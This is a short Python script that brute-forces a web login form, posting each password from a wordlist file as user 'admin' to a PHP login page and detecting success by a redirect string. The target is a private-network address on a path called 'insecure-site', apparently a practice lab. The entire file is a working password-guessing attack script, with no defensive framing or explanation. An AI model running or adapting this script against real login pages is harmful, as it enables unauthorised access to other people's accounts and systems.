import requests

def webAttack():
   print(">>>>> Insecure Website Brute Force Login Attack <<<<<")
   dic = 'dic_passwd.txt'
   url = 'http://192.168.0.92/~gleaming/insecure-site/index.php?page=login'
   flag = False

   security = "high"
   PHPSESSID = "5bfa88dac2a9896a0e80d9dac37cbceb"

   with open(dic, 'r') as f:
      for passwd in f.readlines():
         passwd = passwd.strip()
         data = {
               "id" : "admin",
               "password" : passwd }

         r = requests.post(url, data)
         # print(r.text)

         if r.text.find("<script>location.href='index.php';</script>") > -1:
            print("[+] Find password :", passwd)
            flag = True
            break
         else:
            print("[-] Not password :", passwd)
            pass

   if not flag:
      print("[!] CAN NOT MATCH PASSWORDS in", dic)

   print(">>>>> Finish Attack <<<<<")


def main():
   print("Start Program!\n")
   webAttack()

if __name__ == '__main__':
   main()